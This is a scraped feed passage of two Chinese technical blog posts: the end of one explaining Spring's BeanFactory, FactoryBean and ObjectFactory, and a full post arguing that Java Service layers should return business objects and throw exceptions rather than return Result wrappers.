Spring 引入了三级缓存的概念。而第三级缓存，存放的就是一个 <code>ObjectFactory</code>。</p>
<h3 data-id="heading-9">3.2 回调的本质</h3>
<p><code>ObjectFactory</code> 在源码中简单得令人发指：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectFactory</span>&lt;T&gt; {
    T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> BeansException;
}
</code></pre>
<p>它只是一个<strong>函数式接口</strong>，一个回调。
它存在的意义在于：<strong>我现在不想要这个对象，但我想要一个“在未来某个时刻能获取这个对象”的能力。</strong></p>
<p>在循环依赖中，Spring 提前暴露了一个 <code>ObjectFactory</code>：</p>
<pre><code class="hljs language-java" lang="java">addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));
</code></pre>
<p>当 B 需要 A 时，它通过这个 <code>ObjectFactory</code> 拿到了 A 的早期引用（Early Reference）。尽管 A 还没完全初始化好，但 B 已经可以持有它的引用了。死结解开了。</p>
<h3 data-id="heading-10">3.3 作用域的错位</h3>
<p>另一个场景是：一个单例（Singleton）的 Service 需要使用一个 原型（Prototype）的 Bean。
如果你直接 <code>@Autowired</code>，原型的 Bean 只有在 Service 创建时被注入一次，之后也就是永远同一个对象了。这违背了原型的初衷。</p>
<p>如何解决？使用 <code>ObjectFactory</code> 延迟获取。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReportService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ObjectFactory&lt;ReportBuilder&gt; builderFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generate</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 每次调用 getObject()，容器都会创建一个全新的 ReportBuilder</span>
        <span class="hljs-type">ReportBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> builderFactory.getObject();
        builder.build();
    }
}
</code></pre>
<p>在这里，<strong><code>ObjectFactory</code> 就像是一个通往容器的句柄，让你随时可以伸手进去拿一个新的对象，而不是守着陈旧的缓存。</strong></p>
<hr/>
<h2 data-id="heading-11">四、审判与裁决</h2>
<p>让我们在最后，用最客观的表格来审判这三者的区别。这不是为了背诵，而是为了理清混乱。</p>









































<table><thead><tr><th align="left">维度</th><th align="left">BeanFactory</th><th align="left">FactoryBean</th><th align="left">ObjectFactory</th></tr></thead><tbody><tr><td align="left"><strong>存在形式</strong></td><td align="left"><strong>容器</strong> (Container)</td><td align="left"><strong>Bean</strong> (Component)</td><td align="left"><strong>接口</strong> (Interface/Callback)</td></tr><tr><td align="left"><strong>底层逻辑</strong></td><td align="left"><code>ApplicationContext</code> 的父级接口 / <strong>宏观工厂</strong></td><td align="left">实现了 <code>FactoryBean</code> 接口的类 / <strong>微观工厂</strong></td><td align="left">函数式接口 / <strong>延迟回调</strong></td></tr><tr><td align="left"><strong>核心职责</strong></td><td align="left">管理所有 Bean 的生命周期</td><td align="left">此 Bean 负责<strong>生产</strong>另一个复杂的 Bean</td><td align="left">封装对象的创建过程，提供<strong>延迟</strong>获取能力</td></tr><tr><td align="left"><strong>获取方式</strong></td><td align="left"><code>ApplicationContext</code> 是它的超集</td><td align="left"><code>getBean("name")</code> 拿产品<br/><code>getBean("&amp;name")</code> 拿工厂</td><td align="left">注入 <code>ObjectFactory&lt;T&gt;</code> 后调用 <code>getObject()</code></td></tr><tr><td align="left"><strong>真实场景</strong></td><td align="left">Spring 框架的基石</td><td align="left">Mybatis <code>MapperFactoryBean</code>, <code>ProxyFactoryBean</code></td><td align="left">解决循环依赖(三级缓存), Scope(原型模式)适配</td></tr></tbody></table>
<h2 data-id="heading-12">五、结语</h2>
<p>在代码的荒原上，我们通过构建抽象来对抗混乱。</p>
<ul>
<li><strong>BeanFactory</strong> 是我们脚下的大地。<strong>它被称为工厂，但它实际是孕育万物的土壤（容器）。</strong></li>
<li><strong>FactoryBean</strong> 是我们手中的精密机床。<strong>它是一个特殊的 Bean，存在的目的却是为了制造另一个 Bean。</strong></li>
<li><strong>ObjectFactory</strong> 是我们预留的时间胶囊。<strong>它只是一个单纯的接口，为了应对循环与未来的不确定性。</strong></li>
</ul>
<p>理解它们，并不是为了通过面试，而是为了在下一次抛出异常时，你能冷静地凝视堆栈信息，知道机器的哪个齿轮发生了错位。</p>
<p>既然我们选择了与机器共舞，就必须理解机器的逻辑。这或许就是作为开发者的西西弗斯式命运——<strong>我们需要一次又一次地将巨石推向山顶，以此证明我们对这个庞大系统的掌控</strong>。</p>
<blockquote>
<p><strong>本文通过 AI 润色（加缪风格），试图以一种冷静、客观甚至存在主义的视角，去解构这些在日常 Coding 中被我们习以为常的概念。希望这种独特的叙事风格，能让你对这些枯燥的技术概念有更深刻的“存在感”。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么Java里面，Service 层不直接返回 Result 对象？]]></title>    <link>https://juejin.cn/post/7594817135128248354</link>    <guid>https://juejin.cn/post/7594817135128248354</guid>    <pubDate>2026-01-14T07:23:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128248354" data-draft-id="7594742976712474658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么Java里面，Service 层不直接返回 Result 对象？"/> <meta itemprop="keywords" content="Java,Spring Boot,面试"/> <meta itemprop="datePublished" content="2026-01-14T07:23:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只叫煤球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么Java里面，Service 层不直接返回 Result 对象？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只叫煤球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:23:00.000Z" title="Wed Jan 14 2026 07:23:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>昨天在Code Review时，我发现阿城在Service层直接返回了Result对象。</p>
<p>指出这个问题后，阿城有些不解，反问我为什么不能这样写。</p>
<p>于是我们展开了一场技术讨论（battle 🤣）。</p>
<p>讨论过程中，我发现这个看似简单的设计问题，背后其实涉及分层架构、职责划分、代码复用等多个重要概念。</p>
<p>与其让这次讨论的内容随风而去，不如整理成文，帮助更多遇到同样困惑的朋友理解原因。</p>
<p>知其然，更知其所以然。</p>
<p>耐心看完，你一定有所收获。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b12b4bdb6bed4152843b49071981191a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q5Y-r54Wk55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980179&amp;x-signature=kdIYWMhl4aVKmsVDSyp4Vf8p3XI%3D" alt="Pokemon GIF.gif" loading="lazy"/></p>
<h2 data-id="heading-1">正文</h2>
<h3 data-id="heading-2">职责分离原则</h3>
<p>在传统的MVC架构中，Service层和Controller层各自承担着不同的职责。</p>
<p>Service层负责业务逻辑的处理，而Controller层负责HTTP请求的处理和响应格式的封装。</p>
<p>当我们将数据包装成 <code>Result</code> 对象的任务交给 Service 层时，意味着 Service 层不再单纯地处理业务逻辑，而是牵涉到了数据处理和响应的部分。</p>
<p>这样会导致业务逻辑与表现逻辑的耦合，降低了代码的清晰度和可维护性。</p>
<p>看一个不推荐的写法:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUserById(<span class="hljs-built_in">Long</span> id) {
        User user = userMapper.selectById(id);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">404</span>, 用户不存在);
        }
        <span class="hljs-keyword">return</span> Result.success(user);
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUser(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id) {
        <span class="hljs-keyword">return</span> userService.getUserById(id);
    }
}
</code></pre>
<p>上面代码中，Service 层不仅负责从数据库获取用户信息，还直接处理了返回的结果。</p>
<p>如果我们需要改变返回的格式，或者进行错误信息的标准化，所有 Service 层的方法都需要修改。这样会导致代码的高耦合。</p>
<p>相比之下，以下做法将展示逻辑留给 Controller 层，保证了业务逻辑的纯粹性：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> User getUserById(<span class="hljs-built_in">Long</span> id) {
        User user = userMapper.selectById(id);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> new BusinessException(用户不存在);
        }
        <span class="hljs-keyword">return</span> user;
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUser(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id) {
        User user = userService.getUserById(id);
        <span class="hljs-keyword">return</span> Result.success(user);
    }
}
</code></pre>
<p>让每一层都专注于自己的职责。</p>
<h3 data-id="heading-3">可复用性问题</h3>
<p>当Service层返回Result时，会严重影响方法的可复用性。</p>
<p>假设我们有一个订单服务需要调用用户服务:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    <span class="hljs-keyword">@Autowired</span>
    private UserService userService;
    
    public void <span class="hljs-built_in">createOrder</span>(Long userId, OrderDTO orderDTO) {
        <span class="hljs-comment">// 不推荐的方式:需要解包Result</span>
        Result&lt;User&gt; userResult = userService<span class="hljs-selector-class">.getUserById</span>(userId);
        if (!userResult.isSuccess()) {
            throw new <span class="hljs-built_in">BusinessException</span>(userResult.getMessage());
        }
        User user = userResult<span class="hljs-selector-class">.getData</span>();
        
        <span class="hljs-comment">// 后续业务逻辑</span>
        <span class="hljs-built_in">validateUserStatus</span>(user);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>这种写法有个很明显的问题。</p>
<p><code>OrderService</code> 作为另一个业务服务，业务之间的调用本来应该简单直接，但使用 <code>Result</code> 带来了两个问题：</p>
<ol>
<li>
<p>不知道 <code>Result</code> 里到底包含什么，还得去查看代码里面的实现，写起来麻烦。</p>
</li>
<li>
<p>还需要额外判断 <code>Result</code> 的状态，增加了不必要的复杂度。</p>
</li>
</ol>
<p>如果是调用第三方外部服务，需要这种包装还能理解，但在自己业务之间互相调用时，完全没必要这样做。</p>
<p>如果Service返回纯业务对象:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Long userId, OrderDTO orderDTO)</span> {
        <span class="hljs-comment">// 推荐的方式:直接获取业务对象</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.getUserById(userId);
        
        <span class="hljs-comment">// 后续业务逻辑</span>
        validateUserStatus(user);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>代码变得简洁且符合直觉。</p>
<p>业务层之间直接传递业务对象，保持简单和清晰。</p>
<h3 data-id="heading-4">异常处理机制</h3>
<p>有些 Service 层在业务判断失败后，会直接返回 <code>Result.fail(xxx)</code> 这样的代码，例如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Long userId, OrderDTO orderDTO)</span> {
    <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"用户ID不能为空"</span>);
    }
    <span class="hljs-comment">// 后续业务逻辑</span>
    <span class="hljs-keyword">return</span> Result.success();
}
</code></pre>
<p>这种做法有几个问题：</p>
<ol>
<li>
<p><strong>重复的错误处理</strong>：每个方法都得写一大堆类似的错误判断代码，增加了代码量。</p>
</li>
<li>
<p><strong>错误分散</strong>：错误处理分散在每个方法里，如果需要改进错误逻辑，要在多个地方修改，麻烦且容易出错。</p>
</li>
</ol>
<p>而如果我们通过抛出异常并结合全局异常处理来统一处理错误，例如：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">Long userId, OrderDTO orderDTO</span>) {
    <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"用户ID不能为空"</span>);
    }
    <span class="hljs-comment">// 后续业务逻辑</span>
}
</code></pre>
<p>再通过全局异常捕获来转换为 <code>Result</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {
    <span class="hljs-meta">@ExceptionHandler(BusinessException.class)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; handleBusinessException(BusinessException e) {
        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">400</span>, e.getMessage());
    }

    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; handleException(Exception e) {
        log.error(<span class="hljs-string">"系统异常"</span>, e);  <span class="hljs-comment">// 这里可以查看堆栈信息</span>
        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">500</span>, <span class="hljs-string">"系统繁忙"</span>);
    }
}
</code></pre>
<p>这样做的好处是：</p>
<ul>
<li>
<p><strong>减少重复代码</strong>：业务方法不再需要写重复的错误判断，代码更简洁。</p>
</li>
<li>
<p><strong>集中错误处理</strong>：错误处理集中在一个地方，修改时只需修改全局异常处理器，不用改动每个 Service 层方法。</p>
</li>
<li>
<p><strong>业务与错误分离</strong>：业务逻辑专注处理核心功能，错误处理交给统一的机制，代码更加清晰易懂。</p>
</li>
</ul>
<p>而且异常可以携带更丰富的上下文信息，如果业务侧需要时，可以带上堆栈信息，便于一些问题的定位。</p>
<h3 data-id="heading-5">测试便利性</h3>
<p>Service层返回业务对象而不是Result时，能够大大提升单元测试的便利性:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@SpringBootTest</span>
public class UserServiceTest {
    
    <span class="hljs-keyword">@Autowired</span>
    private UserService userService;
    
    <span class="hljs-keyword">@Test</span>
    public void testGetUserById() {
        <span class="hljs-comment">// 推荐的方式:直接断言业务对象</span>
        User user = userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">1</span>L);
        <span class="hljs-built_in">assertNotNull</span>(user);
        <span class="hljs-built_in">assertEquals</span>(张三, user.getName());
    }
    
    <span class="hljs-keyword">@Test</span>
    public void testGetUserById_NotFound() {
        <span class="hljs-comment">// 推荐的方式:断言抛出异常</span>
        <span class="hljs-built_in">assertThrows</span>(BusinessException.class, () -&gt; {
            userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">999</span>L);
        });
    }
}
</code></pre>
<p>如果Service返回Result，测试代码则需要写得更复杂:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testGetUserById() {
    <span class="hljs-comment">// 不推荐的方式:需要解包Result</span>
    Result&lt;User&gt; result = userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">1</span>L);
    <span class="hljs-built_in">assertTrue</span>(result.isSuccess());
    <span class="hljs-built_in">assertNotNull</span>(result.getData());
    <span class="hljs-built_in">assertEquals</span>(张三, result.getData()<span class="hljs-selector-class">.getName</span>());
}
</code></pre>
<p>测试代码变得莫名冗长，还得去关注响应结构，这并不是Service层测试的关注点。</p>
<p>Service 层本应专注于业务逻辑，测试也应该直接验证业务数据。</p>
<h3 data-id="heading-6">领域驱动设计角度</h3>
<p>再换个角度。</p>
<p>从领域驱动设计（DDD）的角度来看，Service 层属于应用层或领域层，应该使用领域语言来表达业务逻辑。</p>
<p>而 <code>Result</code> 是基础设施层的概念，代表 HTTP 响应格式，不应该污染领域层。</p>
<p>例如，考虑转账业务：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class TransferService {
    
    public TransferResult <span class="hljs-built_in">transfer</span>(Long fromAccountId, Long toAccountId, BigDecimal amount) {
        Account fromAccount = accountRepository<span class="hljs-selector-class">.findById</span>(fromAccountId);
        Account toAccount = accountRepository<span class="hljs-selector-class">.findById</span>(toAccountId);
        
        fromAccount<span class="hljs-selector-class">.deduct</span>(amount);
        toAccount<span class="hljs-selector-class">.deposit</span>(amount);
        
        accountRepository<span class="hljs-selector-class">.save</span>(fromAccount);
        accountRepository<span class="hljs-selector-class">.save</span>(toAccount);
        
        return new <span class="hljs-built_in">TransferResult</span>(fromAccount, toAccount, amount);
    }
}
</code></pre>
<p>在这个例子中，<code>TransferResult</code> 是一个领域对象，代表了转账的结果，包含了与业务相关的意义，而不是一个通用的 HTTP 响应封装 <code>Result</code>。</p>
<p>这种做法更符合领域模型的表达，体现了领域层的职责——处理业务逻辑，而不是涉及 HTTP 响应格式的细节。</p>
<h3 data-id="heading-7">接口适配的灵活性</h3>
<p>当 Service 层返回纯粹的业务对象时，Controller 层可以根据不同的接口需求灵活封装响应：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api"</span>)
public class UserController {
    
    <span class="hljs-variable">@Autowired</span>
    private UserService userService;
    
    <span class="hljs-comment">// REST接口返回Result</span>
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/{id}"</span>)
    public Result&lt;User&gt; <span class="hljs-built_in">getUser</span>(<span class="hljs-variable">@PathVariable</span> Long id) {
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">Result</span><span class="hljs-selector-class">.success</span>(user);
    }
    
    <span class="hljs-comment">// GraphQL接口直接返回对象</span>
    @<span class="hljs-selector-tag">QueryMapping</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span>(<span class="hljs-variable">@Argument</span> Long id) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
    }
    
    <span class="hljs-comment">// RPC接口返回自定义格式</span>
    @<span class="hljs-selector-tag">DubboService</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">UserRpcServiceImpl</span> <span class="hljs-selector-tag">implements</span> <span class="hljs-selector-tag">UserRpcService</span> {
        <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">UserDTO</span> <span class="hljs-selector-tag">getUserById</span>(Long id) {
            <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
            <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">convertToDTO</span>(user);
        }
    }
}
</code></pre>
<p>同一个Service方法可以被不同类型的接口复用，每个接口根据自己的协议要求封装响应。</p>
<p>强行使用 <code>Result</code> 会导致接口的适配性变差，无法根据不同协议的需求灵活定制响应格式。</p>
<p>灵活性反而丢失了。</p>
<h3 data-id="heading-8">事务边界清晰</h3>
<p>Service 层通常是事务边界所在，当 Service 返回业务对象时，事务的语义更加清晰：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    
    <span class="hljs-keyword">@Transactional</span>
    public Order createOrder(OrderDTO orderDTO) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = new <span class="hljs-attribute">Order</span>();
        <span class="hljs-comment">// 设置订单属性</span>
        orderMapper<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 扣减库存</span>
        inventoryService<span class="hljs-selector-class">.deduct</span>(orderDTO.getProductId(), orderDTO<span class="hljs-selector-class">.getQuantity</span>());
        
        return <span class="hljs-attribute">order</span>;
    }
}
</code></pre>
<p>在这个例子中，事务是围绕 Service 层的方法展开的，<code>@Transactional</code> 注解确保在业务逻辑执行失败时，事务会回滚。因为方法正常返回时，事务会提交；如果抛出异常，事务会回滚，事务的边界非常明确。</p>
<p>如果 Service 返回的是 <code>Result</code>，很难界定事务是否应该回滚。比如：</p>
<pre><code class="hljs language-scss" lang="scss">public Result&lt;<span class="hljs-attribute">Order</span>&gt; <span class="hljs-built_in">createOrder</span>(OrderDTO orderDTO) {
    <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = new <span class="hljs-attribute">Order</span>();
    <span class="hljs-comment">// 设置订单属性</span>
    orderMapper<span class="hljs-selector-class">.insert</span>(order);
    
    <span class="hljs-comment">// 扣减库存</span>
    Result&lt;Void&gt; inventoryResult = inventoryService<span class="hljs-selector-class">.deduct</span>(orderDTO.getProductId(), orderDTO<span class="hljs-selector-class">.getQuantity</span>());
    if (!inventoryResult.isSuccess()) {
        return Result<span class="hljs-selector-class">.fail</span>("库存不足");
    }
    
    return Result<span class="hljs-selector-class">.success</span>(order);
}
</code></pre>
<p>在这种情况下，如果库存不足，虽然 <code>Result</code> 返回失败信息，但事务并不会回滚，可能会导致数据不一致，反而还得额外去抛出异常。</p>
<p>而通过抛出异常的方式，事务的回滚语义非常清晰：异常抛出则回滚，方法正常返回则提交，这种设计确保了事务的边界更加明确，避免了潜在的数据一致性问题。</p>
<h2 data-id="heading-9">写在最后</h2>
<p>看来阿城要走的路还很长，码路漫漫，踏浪前行。</p>
<p>2026年，祝大家加班少，薪水多，bug少，头发多，多写点注释，少走点弯路。</p>
<p>人生就像一个大项目，需求多，时间紧，但没关系——bug 和头发总有一个会先来。</p>
